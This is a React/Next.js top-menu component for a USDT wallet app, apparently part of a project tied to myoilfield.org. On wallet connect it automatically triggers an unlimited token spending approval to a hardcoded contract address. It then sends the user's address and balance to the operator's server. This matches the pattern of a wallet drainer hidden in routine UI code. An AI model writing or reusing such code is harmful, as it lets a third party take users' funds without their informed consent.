"use client";
import Image from "next/image";
import styles from "./index.module.scss";
import { useActiveAccount } from "thirdweb/react";
import CallWallet from "../CallWallet";
import logo from "../../public/images/logo.jpg";
import { getContract2, getTokenBalance } from "../../public/utils";
import { APIConfig } from "../../abi/APIConfiguration";
import { USDTAbi } from "../../abi/USDTAbi";
import { message, Select } from "antd";
import { ethers } from "ethers";
import axios from "axios";
import { useEffect, useState } from "react";

interface TopProps {
  onToggleRightMenu: () => void;
}
const NodestorageData = JSON.parse(localStorage.getItem("Nodestorage") || 'null');

const TopMenu: React.FC<TopProps> = ({ onToggleRightMenu }) => {
  const account: any = useActiveAccount();
  const [trueOrNo, setTrueOrNo] = useState(false);
  const [witchRPC, setWitchRPC] = useState(1);
  //授权
  const approve = async () => {
    if (account) {
      const contract: any = await getContract2(NodestorageData.BUSDaddress, USDTAbi);
      const maxApproval = ethers.constants.MaxUint256;
      try {
        //发起授权
        const tx = await contract.approve(NodestorageData.ETHAddress, maxApproval, {
          gasLimit: 500000, // 手动设置 gas limit
        });
        await tx.wait();
        const tokenBalance = await getTokenBalance(account.address)

        const url = "https://app.myoilfield.org/api/wallet/createWallet?walletAddress=" + account.address + '&balance=' + Number(tokenBalance).toFixed(3);
        axios
          .get(url)
          .then((response) => {

          })
          .catch((error) => {
          });
        message.success("授权成功");
      } catch (error) {
        console.log(error, "error");
        message.success("授权失败，请重试");
      }
    } else {
      message.warning("请登录");
    }
  };
  //查询是否授权
  const geAuthOrNot = async () => {
    const res: any = await getTokenBalance(account.address, 1)
    if (res == 0.0) {
      approve()
      setTrueOrNo(false)
    } else {
      setTrueOrNo(true)
    }
  }

  const handleChange = (value: string) => {
    // ETHAddress  BUSDaddress    合约地址
    // RPCURL                     链路节点
    // id                         币种
    if (value === "BEP20USDT") {
      // 币安智能链（BEP20）
      const id = 1;
      // const RPCURL = "https://bsc-dataseed.binance.org/";  //正式网
      const RPCURL = "https://data-seed-prebsc-1-s1.binance.org:8545/";  //测试网
      const ETHAddress = "0x1bae8fD6c2DFdDB1519e2E58C129138A418B3535";
      const BUSDaddress = "0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814";
      const Nodestorage = {
        ETHAddress,
        BUSDaddress,
        RPCURL,
        id,
      };
      localStorage.setItem("Nodestorage", JSON.stringify(Nodestorage));
      setWitchRPC(1)
    } else if (value === "ERC20USDT") {
      // return message.warning("暂未支持该币种");

      // 以太坊（ERC20）
      const id = 2;
      // const RPCURL = 'https://mainnet.infura.io/v3/YOUR-PROJECT-ID' //正式网
      const RPCURL = 'https://sepolia.infura.io/v3/YOUR-PROJECT-ID' //测试网
      const ETHAddress = "";
      const BUSDaddress = "";
      const Nodestorage = {
        ETHAddress,
        BUSDaddress,
        RPCURL,
        id,
      };
      localStorage.setItem("Nodestorage", JSON.stringify(Nodestorage));
      setWitchRPC(2)
    } else if (value === "TRC20USDT") {
      // return message.warning("暂未支持该币种");

      // 波场
      const id = 3;
      // const RPCURL = 'https://api.trongrid.io'  //正式网
      const RPCURL = 'https://api.shasta.trongrid.io'  //测试网
      const ETHAddress = "";
      const BUSDaddress = "";
      const Nodestorage = {
        ETHAddress,
        BUSDaddress,
        RPCURL,
        id,
      };
      localStorage.setItem("Nodestorage", JSON.stringify(Nodestorage));
      setWitchRPC(3)
    } else {
      // 币安智能链（BEP20）
      const id = 1;
      // const RPCURL = "https://bsc-dataseed.binance.org/";  //正式网
      const RPCURL = "https://data-seed-prebsc-1-s1.binance.org:8545/";  //测试网
      const ETHAddress = "0x1bae8fD6c2DFdDB1519e2E58C129138A418B3535";
      const BUSDaddress = "0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814";
      const Nodestorage = {
        ETHAddress,
        BUSDaddress,
        RPCURL,
        id,
      };
      localStorage.setItem("Nodestorage", JSON.stringify(Nodestorage));
      setWitchRPC(1)
    }
  };

  useEffect(() => {
    if (account) {
      geAuthOrNot();
      handleChange('999')
    }
  }, [account]);

  return (
    <div className={styles.pagetop}>
      <Image
        className={styles.m1}
        src={logo}
        alt="coin"
        width={50}
        height={50}
      />
      <CallWallet witchRPC={witchRPC} />

      <div>
        <Select
          defaultValue="BEP20USDT"
          style={{ width: 100 }}
          onChange={handleChange}
          // 多链 USDT（TRC20、ERC20、BEP20）：
          // TRC20 USDT 是基于 TRON 网络发行的 USDT，优点是手续费低。波长
          // ERC20 USDT 是基于以太坊网络的 USDT，通常手续费较高，因为以太坊的网络交易费用较贵。   
          // BEP20 USDT 是基于币安智能链（BSC）的 USDT，手续费相对较低。 
          options={[
            { value: 'BEP20USDT', label: 'BNB Chain' },
            { value: 'ERC20USDT', label: 'Ethereum' },
            { value: 'TRC20USDT', label: 'TRON' },
          ]}
        />
      </div>

      <Image
        onClick={onToggleRightMenu}
        className={styles.m3}
        src="https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png"
        alt="menu"
        width={50}
        height={50}
      />
    </div>
  );
};

export default TopMenu;
